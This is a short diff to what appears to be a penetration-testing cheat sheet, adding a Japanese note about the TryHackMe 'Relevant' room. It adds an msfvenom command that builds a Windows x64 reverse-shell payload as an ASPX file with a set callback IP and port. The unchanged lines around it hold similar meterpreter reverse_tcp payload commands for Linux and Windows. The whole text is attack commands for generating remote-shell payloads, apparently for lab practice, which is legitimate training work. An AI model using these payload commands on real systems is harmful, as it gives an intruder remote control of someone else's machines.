@@ -677,6 +677,10 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
+
+x64 と判明していた場合(TryHackMe relevant)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.219.23 LPORT=4242   -f aspx > reverse.aspx  
+
 ```
 
 
